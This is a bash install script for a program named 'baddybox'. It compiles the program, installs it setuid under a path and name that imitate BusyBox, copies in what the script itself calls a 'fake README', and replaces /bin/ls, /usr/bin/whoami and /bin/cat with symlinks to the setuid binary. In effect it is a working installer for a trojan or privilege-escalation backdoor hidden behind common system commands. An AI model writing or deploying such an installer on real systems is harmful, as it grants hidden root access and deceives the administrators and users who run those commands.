#!/usr/bin/env bash

# Must match REALPATH define in baddybox.c
install_path="/var/lib/busybox"
install_as="busybox"
targets=( "/bin/ls" "/usr/bin/whoami" "/bin/cat" )

err() {
    echo "!!! $@" >&2
    exit 1
}

warn() {
    echo "!!! $@" >&2
}

msg() {
    echo "==> $@"
}

make_target_dir() {
    mkdir -p "$install_path"
}

install_readme() {
    cp "INSTALL-README.md" "${install_path}/README.md"
}

replace_targets() {
    for target in "${targets[@]}"; do
        local target_base="$(basename "$target")"
        local install_loc="${install_path}/${target_base}"

        if [ -L "$target" ]; then
            warn "$target is a symlink and will not be replaced"
            continue;
        fi

        mv "$target" "$install_loc"\
            || warn "Unable to move $target"

        ln -s "${install_path}/${install_as}" "$target"\
            || warn "Unable to symlink baddybox to $target"
    done
}

compile_baddybox() {
    gcc -std=c99 -o baddybox baddybox.c
}

install_baddybox() {
    cp baddybox "${install_path}/${install_as}"
}

setuid_baddybox() {
    chmod +s "${install_path}/${install_as}"
}

main() {
    if [ "$UID" -ne 0 ]; then
        err "This install script must be run as root."
    fi

    msg "Attempting to \`cd\` to script directory"
    cd "$(dirname "$0")"\
        || err "Unable to \`cd\` to script directory"

    msg "Compiling baddybox"
    compile_baddybox\
        || err "Unable to compile"

    msg "Creating ${install_path}"
    make_target_dir\
        || err "Unable to create directory"

    msg "Installing baddybox"
    install_baddybox\
        || err "Unable to install baddybox"

    msg "Add setuid to baddybox"
    setuid_baddybox\
        || err "Unable to setuid baddybox"

    msg "Installing fake README"
    install_readme\
        || err "Unable to install fake README"

    msg "Replacing targets"
    replace_targets

    msg "DONE"
}

main "$@"
